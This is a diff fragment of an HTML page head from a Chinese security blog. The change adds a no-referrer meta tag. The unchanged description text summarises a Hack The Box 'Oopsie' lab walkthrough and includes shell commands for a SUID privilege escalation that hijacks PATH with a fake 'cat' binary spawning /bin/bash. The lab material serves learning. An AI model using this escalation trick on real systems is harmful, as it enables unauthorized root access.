@@ -38,6 +38,7 @@ LINUX s权限位提权：http://www.361way.com/suid-privilege/5965.html
 robert@oopsie:/$ export PATH=/tmp:$PATH robert@oopsie:/$ cd /tmp robert@oopsie:/tmp$ echo &amp;#39;/bin/bash&amp;#39; &amp;gt; cat robert@oopsie:/tmp$ chmod &#43;x cat  export PATH=/tmp:$PATH export是设置环境变量，这条语句设置PATH的变量，/tmp:$PATH 的$PATH代表原本的PATH变量，把/tmp加到这边变量的前面
 4、提权到root发现cat用不了，因为我们已经改变了cat为/bin/bash,可以使用more、xxd等命令查看文件内容" /><meta name="keywords"
   content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+  <meta name="referrer" content="no-referrer" />
 
 
 <link rel="stylesheet" href="https://getshe11.com/css/main.css">
